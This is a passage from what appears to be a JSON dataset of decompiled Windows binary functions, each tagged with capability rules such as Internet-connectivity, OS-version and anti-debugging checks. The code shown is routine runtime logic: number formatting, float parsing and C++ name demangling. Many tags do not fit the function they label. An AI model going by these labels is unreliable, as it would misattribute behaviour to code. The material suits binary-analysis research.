        "decompiled_code": "\nvoid __thiscall fcn.004b4da0(int32_t *param_1, ushort *param_2, int32_t param_3, uint param_4, int32_t param_5)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    ushort *puVar3;\n    int32_t iVar4;\n    int32_t iStack64;\n    ushort *puStack60;\n    int32_t iStack40;\n    int32_t aiStack32 [4];\n    \n    iVar1 = param_1[1];\n    aiStack32[0] = (param_5 - param_3) + iVar1;\n    if (param_1 + 2 == *param_1) {\n        iVar4 = 7;\n    }\n    else {\n        iVar4 = param_1[2];\n    }\n    puVar3 = fcn.004b4d20(aiStack32, iVar4);\n    puVar2 = *param_1;\n    if (param_2 != NULL) {\n        if (param_2 == 0x1) {\n            *puVar3 = *puVar2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3, puVar2, param_2 * 2);\n        }\n    }\n    if ((param_2 != NULL) && (param_3 != 0)) {\n        if (param_3 == 1) {\n            puVar3[param_2] = *param_2;\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + param_2, param_2, param_3 * 2);\n        }\n    }\n    if (iStack64 != 0) {\n        if (iStack64 == 1) {\n            puVar3[param_2 + param_3] = puVar2[iVar1 - (param_2 + param_3)];\n        }\n        else {\n            sub.msvcrt.dll_memcpy(puVar3 + param_2 + param_3, puVar2 + (iVar1 - (param_2 + param_3)), iStack64 * 2);\n        }\n    }\n    if (puStack60 != puVar2) {\n        fcn.004c2c30(puVar2);\n    }\n    *param_1 = puVar3;\n    param_1[2] = iStack40;\n    return;\n}\n",
        "token_count": 513
    },
    "004bccb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004bccb0(uchar *param_1, uint32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    \n    puVar3 = param_1;\n    if (param_5 == '\\0') {\n        if ((param_4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 7;\n                param_2 = param_2 >> 3;\n                *puVar3 = *(param_3 + 4 + uVar2);\n            } while (param_2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 0xf;\n                param_2 = param_2 >> 4;\n                *puVar3 = *(param_3 + 0x14 + (-((param_4 & 0x4000) == 0) & 0xfffffff0) + uVar2);\n            } while (param_2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(param_3 + 4 + param_2 % 10);\n            bVar1 = 9 < param_2;\n            param_2 = param_2 / 10;\n        } while (bVar1);\n    }\n    return param_1 - puVar3;\n}\n",
        "token_count": 363
    },
    "004bcd60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004bcd60(uchar *param_1, uint32_t param_2, uint32_t param_3, int32_t param_4, uint32_t param_5, char param_6\n                    )\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_4h;\n    int32_t var_14h;\n    \n    uVar5 = CONCAT44(param_3, param_2);\n    puVar2 = param_1;\n    if (param_6 == '\\0') {\n        if ((param_5 & 0x4a) == 0x40) {\n            do {\n                uVar3 = param_2 >> 3 | param_3 << 0x1d;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 3;\n                *puVar2 = *(var_14h + 4 + (param_2 & 7));\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n        else {\n            do {\n                uVar3 = param_2 >> 4 | param_3 << 0x1c;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 4;\n                *puVar2 = *(var_14h + 0x14 + (-((param_5 & 0x4000) == 0) & 0xfffffff0) + (param_2 & 0xf));\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n    }\n    else {\n        do {\n            iVar4 = uVar5 >> 0x20;\n            uVar3 = uVar5;\n            puVar2 = puVar2 + -1;\n            iVar1 = fcn.00438000(uVar5, 10, 0);\n            *puVar2 = *(var_14h + 4 + iVar1);\n            uVar5 = fcn.00437f00(uVar5, 10, 0);\n        } while (iVar4 != 0 || -iVar4 < (9 < uVar3));\n    }\n    return param_1 - puVar2;\n}\n",
        "token_count": 524
    },
    "004bce50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004bce50(ushort *param_1, uint32_t param_2, int32_t param_3, uint32_t param_4, char param_5)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    \n    puVar3 = param_1;\n    if (param_5 == '\\0') {\n        if ((param_4 & 0x4a) == 0x40) {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 7;\n                param_2 = param_2 >> 3;\n                *puVar3 = *(param_3 + 8 + uVar2 * 2);\n            } while (param_2 != 0);\n        }\n        else {\n            do {\n                puVar3 = puVar3 + -1;\n                uVar2 = param_2 & 0xf;\n                param_2 = param_2 >> 4;\n                *puVar3 = *(param_3 + (uVar2 + (-((param_4 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n            } while (param_2 != 0);\n        }\n    }\n    else {\n        do {\n            puVar3 = puVar3 + -1;\n            *puVar3 = *(param_3 + 8 + (param_2 % 10) * 2);\n            bVar1 = 9 < param_2;\n            param_2 = param_2 / 10;\n        } while (bVar1);\n    }\n    return param_1 - puVar3 >> 1;\n}\n",
        "token_count": 379
    },
    "004bcf00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.004bcf00(ushort *param_1, uint32_t param_2, uint32_t param_3, int32_t param_4, uint32_t param_5, \n                    char param_6)\n\n{\n    int32_t iVar1;\n    ushort *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    ushort *var_8h;\n    \n    uVar5 = CONCAT44(param_3, param_2);\n    puVar2 = var_8h;\n    if (param_6 == '\\0') {\n        if ((param_5 & 0x4a) == 0x40) {\n            do {\n                uVar3 = param_2 >> 3 | param_3 << 0x1d;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 3;\n                *puVar2 = *(param_4 + 8 + (param_2 & 7) * 2);\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n        else {\n            do {\n                uVar3 = param_2 >> 4 | param_3 << 0x1c;\n                puVar2 = puVar2 + -1;\n                param_3 = param_3 >> 4;\n                *puVar2 = *(param_4 + ((param_2 & 0xf) + (-((param_5 & 0x4000) == 0) & 0xfffffff0) + 0x14) * 2);\n                param_2 = uVar3;\n            } while ((param_3 | uVar3) != 0);\n        }\n    }\n    else {\n        do {\n            iVar4 = uVar5 >> 0x20;\n            uVar3 = uVar5;\n            puVar2 = puVar2 + -1;\n            iVar1 = fcn.00438000(uVar5, 10, 0);\n            *puVar2 = *(param_4 + 8 + iVar1 * 2);\n            uVar5 = fcn.00437f00(uVar5, 10, 0);\n        } while (iVar4 != 0 || -iVar4 < (9 < uVar3));\n    }\n    return var_8h - puVar2 >> 1;\n}\n",
        "token_count": 531
    },
    "004bd2f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004bd2f0(char *param_1, double *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float10 fVar4;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004c2c50(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x526540);\n    fVar4 = fcn.0043c6d0(param_1, apcStack32);\n    *param_2 = fVar4;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0.0;\n        *param_3 = 4;\n    }\n    else if ((fVar4 < *0x5265c8) || (*0x5265c0 < fVar4)) {\n        if (fVar4 <= 0) {\n            *param_2 = *0x5265c8;\n            *param_3 = 4;\n        }\n        else {\n            *param_2 = *0x5265c0;\n            *param_3 = 4;\n        }\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004c2c20(uVar3);\n    return;\n}\n",
        "token_count": 368
    },
    "004bd410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004bd410(char *param_1, float10 *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float10 fVar4;\n    float10 fVar5;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004c2c50(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x526540);\n    fVar4 = fcn.0043d5f0(param_1, apcStack32);\n    *param_2 = fVar4;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0;\n        *param_3 = 4;\n    }\n    else if ((fVar4 < *0x5265e0) || (*0x5265d0 < fVar4)) {\n        fVar5 = *0x5265e0;\n        if (0 < fVar4) {\n            fVar5 = *0x5265d0;\n        }\n        *param_2 = fVar5;\n        *param_3 = 4;\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004c2c20(uVar3);\n    return;\n}\n",
        "token_count": 365
    },
    "004bd520": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.004bd520(char *param_1, float *param_2, uint *param_3)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    float fVar4;\n    float10 fVar5;\n    char *apcStack32 [4];\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.004c2c50(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, 0x526540);\n    fVar5 = fcn.0043c7d0(param_1, apcStack32);\n    *param_2 = fVar5;\n    if ((apcStack32[0] == param_1) || (*apcStack32[0] != '\\0')) {\n        *param_2 = 0.0;\n        *param_3 = 4;\n    }\n    else if ((fVar5 < *0x5265b8) || (*0x5265b4 < fVar5)) {\n        fVar4 = *0x5265b8;\n        if (0 < fVar5) {\n            fVar4 = *0x5265b4;\n        }\n        *param_2 = fVar4;\n        *param_3 = 4;\n    }\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.004c2c20(uVar3);\n    return;\n}\n",
        "token_count": 365
    },
    "004c3130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.004c3130(char *param_1)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_EBP;\n    ulong uVar5;\n    uchar *in_stack_00000034;\n    int32_t in_stack_00000038;\n    uint uVar6;\n    \n    if (*param_1 != '\\0') {\n        return NULL;\n    }\n    if (*0x515a34 != 0) {\n        fcn.00438120(0x5174e8, 0x4484f0);\n        if (*0x515a34 == 0) {\n            if (*param_1 != '\\0') {\n                return NULL;\n            }\n        }\n        else {\n            iVar3 = fcn.004383e0(*0x5168e0);\n            if (iVar3 != 0) goto code_r0x004c31da;\n            if (*param_1 != '\\0') {\n                if (*0x515a34 == 0) {\n                    return NULL;\n                }\n                iVar3 = fcn.004384b0(*0x5168e0);\n                if (iVar3 == 0) {\n                    return NULL;\n                }\n                fcn.00449d40();\n                goto code_r0x004c31d5;\n            }\n        }\n        if (param_1[1] != '\\0') {\n            fcn.00448110();\n            return NULL;\n        }\ncode_r0x004c3157:\n        param_1[1] = '\\x01';\n        return 0x1;\n    }\n    if (*param_1 != '\\0') {\n        return NULL;\n    }\n    if (param_1[1] == '\\0') goto code_r0x004c3157;\ncode_r0x004c31d5:\n    fcn.00448110();\ncode_r0x004c31da:\n    puVar2 = fcn.004c2d80(4);\n    *puVar2 = 0x52b508;\n    puVar2 = fcn.004c3330(puVar2, 0x528188, 0x449ae0);\n    if ((*0x515a34 != 0) && (iVar3 = fcn.004384b0(*0x5168e0),  iVar3 != 0)) {\n        fcn.00449d40();\n    }\n    uVar5 = fcn.0043a8e0(puVar2);\n    if (uVar5 >> 0x20 == -1) {\n        fcn.004c2f10(uVar5);\n    }\n    uVar5 = fcn.0043a8e0();\n    if (uVar5 >> 0x20 == -1) {\n        fcn.004c2f10(uVar5);\n    }\n    uVar5 = fcn.0043a8e0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    fcn.004c2f10();\n    *puVar2 = 0x52c8b4;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    *puVar2 = 0x52c8e0;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    fcn.004c2c30(puVar2);\n    fcn.0043a8e0();\n    fcn.004c2c30(puVar2);\n    fcn.0043a8e0();\n    *puVar2 = 0x52c8b4;\n    fcn.004aea60();\n    fcn.0043a8e0();\n    *puVar2 = 0x52c8e0;\n    fcn.004aea60();\n    uVar5 = fcn.0043a8e0();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    if (uVar5 >> 0x20 != -1) {\n        fcn.0043a8e0(uVar5);\n    }\n    uVar5 = fcn.004c2f10();\n    uVar6 = uVar5;\n    if (uVar5 >> 0x20 != 1) {\ncode_r0x004c4e66:\n        fcn.004c2e40(uVar6);\n        iVar3 = *(*unaff_EBP + -0xc);\n        puVar1 = unaff_EBP + iVar3 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(unaff_EBP + iVar3 + 0x10) & 1) != 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c2fb0();\n        if (in_stack_00000038 < 1) {\n            iVar3 = unaff_EBP[1];\n        }\n        else {\n            *in_stack_00000034 = 0;\n            iVar3 = unaff_EBP[1];\n        }\n        if (iVar3 == 0) {\n            fcn.004bbce0(*(unaff_EBP + *(*unaff_EBP + -0xc) + 0x14) | 4);\n            return unaff_EBP;\n        }\n        return unaff_EBP;\n    }\n    fcn.004c2e40(uVar6);\n    unaff_EBP = unaff_EBP + *(*unaff_EBP + -0xc);\n    unaff_EBP[5] = unaff_EBP[5] | 1;\n    if ((*(unaff_EBP + 4) & 1) != 0) {\n        fcn.004c32d0();\n        goto code_r0x004c4e66;\n    }\n    piVar4 = fcn.004c32d0();\n    fcn.004c2fb0();\n    uVar5 = fcn.0043a8e0(piVar4);\n    uVar6 = uVar5;\n    if (uVar5 >> 0x20 == 1) {\n        fcn.004c2e40(uVar6);\n        piVar4 = piVar4 + *(*piVar4 + -0xc);\n        piVar4[5] = piVar4[5] | 1;\n        if ((*(piVar4 + 4) & 1) != 0) {\n            fcn.004c32d0();\n            goto code_r0x004c4eed;\n        }\n    }\n    else {\ncode_r0x004c4eed:\n        fcn.004c2e40(uVar6);\n        iVar3 = *(*piVar4 + -0xc);\n        puVar1 = piVar4 + iVar3 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(piVar4 + iVar3 + 0x10) & 1) == 0) goto code_r0x00487da6;\n        fcn.004c32d0();\n    }\n    piVar4 = fcn.004c32d0();\n    fcn.004c2fb0();\n    fcn.0043a8e0(piVar4);\ncode_r0x00487da6:\n    fcn.004c2fb0();\n    return piVar4;\n}\n",
        "token_count": 1909
    },
    "0043ac90": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0043ac90(void)\n\n{\n    uint8_t in_AL;\n    uint8_t uVar1;\n    int32_t extraout_EDX;\n    int32_t iVar2;\n    uint64_t uVar3;\n    \n    if (in_AL == 0xff) {\n        return 0;\n    }\n    uVar1 = in_AL & 7;\n    if (uVar1 == 2) {\n        return 2;\n    }\n    if (uVar1 < 3) {\n        if ((in_AL & 7) == 0) {\n            return 4;\n        }\n    }\n    else {\n        if (uVar1 == 3) {\n            return 4;\n        }\n        if (uVar1 == 4) {\n            return 8;\n        }\n    }\n    uVar3 = sub.msvcrt.dll_abort();\n    iVar2 = uVar3 >> 0x20;\n    if (uVar3 == 0xff) {\n        return 0;\n    }\n    uVar1 = uVar3 & 0x70;\n    if (uVar1 != 0x20) {\n        if (uVar1 < 0x21) {\n            if ((uVar3 & 0x70) == 0) {\n                return 0;\n            }\n            if (uVar1 == 0x10) {\n                return 0;\n            }\n        }\n        else {\n            if (uVar1 == 0x30) {\n                return *(iVar2 + 8);\n            }\n            if (uVar1 == 0x50) {\n                return 0;\n            }\n        }\n        sub.msvcrt.dll_abort();\n        iVar2 = extraout_EDX;\n    }\n    return *(iVar2 + 4);\n}\n",
        "token_count": 382
    },
    "004ba1e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004ba1e0(void)\n\n{\n    if (*0x515a34 != 0) {\n        LOCK();\n    }\n    if (*0x516f90 == 2) {\n        *0x516f90 = 1;\n        fcn.00489400();\n        fcn.00489400();\n        fcn.00489400();\n        fcn.0049f0c0();\n        fcn.0049f0c0();\n        fcn.0049f0c0();\n        return;\n    }\n    *0x516f90 = *0x516f90 + -1;\n    return;\n}\n",
        "token_count": 139
    },
    "0042e860": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.0042e860(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    uint8_t uVar10;\n    uint *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    char cVar14;\n    int32_t iStack32;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    cVar14 = *pcVar1;\n    if (cVar14 == 'S') {\n        if (pcVar1[1] == 't') {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            uVar7 = fcn.0042fbd0();\n            iVar4 = *(in_EAX + 0x14);\n            if (iVar4 < *(in_EAX + 0x18)) {\n                puVar11 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                *(in_EAX + 0x14) = iVar4 + 1;\n                puVar11[1] = 0;\n                *puVar11 = 0;\n                puVar11[2] = 0x524ed1;\n                puVar11[3] = 3;\n            }\n            iVar4 = fcn.0042d480(uVar7);\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 3;\n            cVar14 = **(in_EAX + 0xc);\njoined_r0x0042eabd:\n            if (cVar14 != 'I') {\n                return iVar4;\n            }\n            if ((iVar4 == 0) || (iVar5 = *(in_EAX + 0x20),  *(in_EAX + 0x24) <= iVar5)) goto code_r0x0042e9d6;\n            *(*(in_EAX + 0x1c) + iVar5 * 4) = iVar4;\n            *(in_EAX + 0x20) = iVar5 + 1;\n        }\n        else {\n            iVar4 = fcn.0042d9c0();\n            if (**(in_EAX + 0xc) != 'I') {\n                return iVar4;\n            }\n        }\n        uVar7 = fcn.0042e830();\n        iVar4 = fcn.0042d480(uVar7);\n    }\n    else {\n        if (cVar14 < 'T') {\n            if (cVar14 != 'N') goto code_r0x0042ea00;\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            piVar2 = fcn.0042f8d0();\n            if (piVar2 != NULL) {\n                iVar5 = fcn.0042d4e0();\n                puVar12 = *(in_EAX + 0xc);\n                uVar8 = *puVar12;\n                iVar4 = 0;\ncode_r0x0042e953:\n                cVar14 = uVar8;\n                if (cVar14 != '\\0') {\n                    puVar13 = puVar12;\n                    if (cVar14 == 'D') {\n                        if ((puVar12[1] & 0xdf) != 0x54) {\n                            iVar6 = fcn.0042fbd0();\n                            goto code_r0x0042eae2;\n                        }\n                        iVar6 = fcn.0042ed40();\n                        goto code_r0x0042eae2;\n                    }\ncode_r0x0042e960:\n                    cVar14 = uVar8;\n                    if (0x1c < uVar8 - 0x30) {\n                        if (cVar14 + 0x9fU < 0x1a) goto code_r0x0042e979;\n                        if (cVar14 != 'U') {\n                            if (cVar14 != 'S') goto code_r0x0042ebc0;\n                            iVar6 = fcn.0042d9c0();\n                            if (iVar4 != 0) goto code_r0x0042e98d;\n                            puVar12 = *(in_EAX + 0xc);\n                            uVar8 = *puVar12;\n                            iVar4 = iVar6;\n                            goto code_r0x0042e953;\n                        }\n                        iVar6 = fcn.0042fbd0();\n                        if (iVar4 != 0) goto code_r0x0042e98d;\ncode_r0x0042eaef:\n                        puVar13 = *(in_EAX + 0xc);\n                        uVar10 = *puVar13;\n                        goto code_r0x0042e9a6;\n                    }\n                    if ((0x100803ffU >> (uVar8 - 0x30 & 0x1f) & 1) == 0) {\ncode_r0x0042ebc0:\n                        if (cVar14 != 'I') {\n                            if (cVar14 == 'T') {\n                                iVar6 = fcn.0042d790();\ncode_r0x0042eae2:\n                                if (iVar4 == 0) goto code_r0x0042eaef;\n                                goto code_r0x0042e98d;\n                            }\n                            if (cVar14 == 'E') {\n                                *piVar2 = iVar4;\n                                if (iVar4 != 0) {\n                                    if (iVar5 != 0) {\n                                        *(iVar5 + 8) = iStack32;\n                                        iStack32 = iVar5;\n                                    }\n                                    if (*puVar13 == 0x45) {\n                                        *(in_EAX + 0xc) = puVar13 + 1;\n                                        return iStack32;\n                                    }\n                                }\n                                goto code_r0x0042e9d6;\n                            }\n                            if ((iVar4 == 0) || (cVar14 != 'M')) goto code_r0x0042e9d0;\n                            puVar12 = puVar13 + 1;\n                            *(in_EAX + 0xc) = puVar12;\n                            uVar8 = puVar13[1];\n                            goto code_r0x0042e953;\n                        }\n                        if (iVar4 == 0) goto code_r0x0042e9d0;\n                        *(in_EAX + 0xc) = puVar13 + 1;\n                        iVar6 = fcn.0042e720();\ncode_r0x0042e98d:\n                        iVar6 = fcn.0042d480(iVar6);\n                    }\n                    else {\ncode_r0x0042e979:\n                        iVar6 = fcn.0042fbd0();\n                        if (iVar4 != 0) goto code_r0x0042e98d;\n                    }\n                    puVar13 = *(in_EAX + 0xc);\n                    uVar10 = *puVar13;\n                    puVar12 = puVar13;\n                    if (cVar14 == 'S') goto code_r0x0042e9ca;\ncode_r0x0042e9a6:\n                    if (uVar10 != 0x45) goto code_r0x0042e9af;\n                    uVar8 = 0x45;\n                    iVar4 = iVar6;\n                    goto code_r0x0042e960;\n                }\ncode_r0x0042e9d0:\n                *piVar2 = 0;\n            }\n        }\n        else {\n            if (cVar14 == 'U') {\n                iVar4 = fcn.0042fbd0();\n                return iVar4;\n            }\n            if (cVar14 != 'Z') {\ncode_r0x0042ea00:\n                iVar4 = fcn.0042fbd0();\n                cVar14 = **(in_EAX + 0xc);\n                goto joined_r0x0042eabd;\n            }\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            piVar2 = fcn.0042ffd0();\n            if ((piVar2 != NULL) && (pcVar1 = *(in_EAX + 0xc),  *pcVar1 == 'E')) {\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                if (pcVar1[1] == 's') {\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    iVar4 = fcn.0042dc60();\n                    if (iVar4 != 0) {\n                        iVar4 = *(in_EAX + 0x14);\n                        if (iVar4 < *(in_EAX + 0x18)) {\n                            puVar3 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                            *(in_EAX + 0x14) = iVar4 + 1;\n                            puVar3[1] = 0;\n                            *puVar3 = 0;\n                            puVar3[2] = \"string literal\";\n                            puVar3[3] = 0xe;\n                            goto code_r0x0042e8e9;\n                        }\ncode_r0x0042ed0b:\n                        puVar3 = NULL;\ncode_r0x0042e8e9:\n                        if ((*piVar2 == 3) && (*piVar2[3] == 0x29)) {\n                            piVar2[3][2] = 0;\n                        }\n                        iVar4 = fcn.0042d480(puVar3);\n                        return iVar4;\n                    }\n                }\n                else if (pcVar1[1] == 'd') {\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    uVar8 = fcn.0042d750();\n                    if ((-1 < uVar8) &&\n                       (((puVar9 = fcn.0042e860(),  puVar9 == NULL || ((*puVar9 & 0xfffffffd) == 0x45)) ||\n                        (iVar4 = fcn.0042dc60(),  iVar4 != 0)))) {\n                        iVar4 = *(in_EAX + 0x14);\n                        if (iVar4 < *(in_EAX + 0x18)) {\n                            puVar3 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                            puVar3[1] = 0;\n                            *(in_EAX + 0x14) = iVar4 + 1;\n                            *puVar3 = 0x46;\n                            puVar3[3] = uVar8;\n                            puVar3[2] = puVar9;\n                            goto code_r0x0042e8e9;\n                        }\n                        goto code_r0x0042ed0b;\n                    }\n                }\n                else {\n                    puVar3 = fcn.0042e860();\n                    if (((puVar3 == NULL) || ((*puVar3 & 0xfffffffd) == 0x45)) || (iVar4 = fcn.0042dc60(),  iVar4 != 0))\n                    goto code_r0x0042e8e9;\n                }\n            }\n        }\ncode_r0x0042e9d6:\n        iVar4 = 0;\n    }\n    return iVar4;\ncode_r0x0042e9af:\n    if ((iVar6 == 0) || (iVar4 = *(in_EAX + 0x20),  *(in_EAX + 0x24) <= iVar4)) goto code_r0x0042e9d0;\n    *(*(in_EAX + 0x1c) + iVar4 * 4) = iVar6;\n    *(in_EAX + 0x20) = iVar4 + 1;\n    uVar10 = *puVar13;\n    puVar12 = puVar13;\ncode_r0x0042e9ca:\n    uVar8 = uVar10;\n    iVar4 = iVar6;\n    goto code_r0x0042e953;\n}\n",
        "token_count": 2671
    },
    "0043afc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043afc0(uint param_1, int32_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uStack56;\n    int32_t iStack48;\n    uint32_t auStack32 [4];\n    \n    if (*param_2 == 0) {\n        iStack48 = 0;\n    }\n    else {\n        iStack48 = 0;\n        iVar3 = 0;\n        do {\n            iVar5 = iVar3;\n            if (param_2[1] != 0) {\n                iVar5 = param_2 + (4 - param_2[1]);\n                if (iVar5 != iVar3) {\n                    uVar2 = fcn.0043aed0();\n                    if (uVar2 == 0xff) {\n                        return -1;\n                    }\n                    fcn.0043ace0();\n                    uVar1 = *(in_EAX + 4);\n                    if ((uVar1 & 0x7f8) == 0x7f8) {\n                        uStack56 = uVar2;\n                        *(in_EAX + 4) = uVar1 & 0xf807 | uStack56 << 3;\n                    }\n                    else if (uVar1 >> 3 != uVar2) {\n                        *(in_EAX + 4) = *(in_EAX + 4) | 